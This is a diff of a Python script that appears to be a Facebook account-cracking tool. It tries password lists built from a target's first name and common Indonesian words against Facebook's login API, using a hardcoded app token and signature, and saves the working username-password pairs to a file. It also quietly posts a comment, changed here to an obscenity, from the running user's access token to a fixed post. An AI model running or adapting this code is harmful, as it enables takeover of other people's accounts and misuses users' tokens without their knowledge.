@@ -114,7 +114,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"123",nama+"1234",nama+"12345","Pelakor","Anjing","@"+nama,"kekasih hati","SayangKamu","sayang",cilacap1]:
+		for pas in [nama+"123",nama+"1234",nama+"12345","Pelakor","Anjing","@"+nama,"kontol","jamannow","sayang",cilacap1]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -153,18 +153,18 @@ def cek():
 		toket = open("cookie/token.log","r").read()
 	except OSError:
 		print("%s[×] %sups sorry token not found !!"%(R,W))
-		sleep(0.1)
+		sleep(1)
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100005584243934_1145924785603652/comments?message=Mantap&access_token=%s"%(toket)))
+		s.post(url.format("100005584243934_1145924785603652/comments?message=Kontol....&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
-		sleep(0.1)
+		sleep(1)
 		menu(n,toket)
 	except KeyError:
 		os.system("rm -rf cookie/token.log")
 		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
-		sleep(0.1)
+		sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
 		exit("%s[!] %sups no connection !!"%(R,W))
